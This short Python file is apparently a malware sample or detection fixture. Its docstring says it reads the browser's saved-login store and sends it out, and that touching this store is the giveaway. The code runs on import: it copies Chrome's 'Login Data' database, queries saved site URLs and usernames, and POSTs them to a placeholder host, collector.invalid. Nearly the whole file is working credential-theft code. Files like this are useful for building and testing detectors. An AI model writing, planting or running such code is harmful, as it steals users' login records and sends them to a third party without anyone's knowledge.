"""Reads the browser's saved-login store and sends it somewhere.

The access is the signal. A browser's login database is read by the browser and
by almost nothing else, so a package touching it has explained itself.
"""

import os
import shutil
import sqlite3
import urllib.request
from pathlib import Path

profile = Path.home() / ".config" / "google-chrome" / "Default" / "Login Data"
staging = Path(os.environ.get("TMPDIR", "/tmp")) / "ld"
shutil.copy(profile, staging)

rows = sqlite3.connect(staging).execute("SELECT origin_url, username_value FROM logins")
urllib.request.urlopen("https://collector.invalid/i", str(list(rows)).encode())
